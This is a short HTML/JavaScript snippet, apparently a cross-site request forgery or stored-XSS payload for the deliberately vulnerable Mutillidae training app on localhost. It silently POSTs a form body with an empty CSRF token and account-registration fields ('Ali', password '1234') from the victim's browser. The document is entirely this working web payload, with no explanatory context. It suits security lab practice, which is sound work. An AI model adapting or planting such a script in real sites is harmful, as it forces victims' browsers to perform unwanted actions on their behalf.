
<script>
        var http = new XMLHttpRequest();
	var url= "";
	url = url.concat("csrf-token=&username=Ali&password=1234&confirm_password=1234&my_signature&register-php-submit-button=Create+Account");


	http.open("POST", "https://localhost/mutillidae/index.php?page=add-to-your-blog.php", true);
	http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	http.setRequestHeader("Content-Length", url.length);
	http.send(url);
</script>
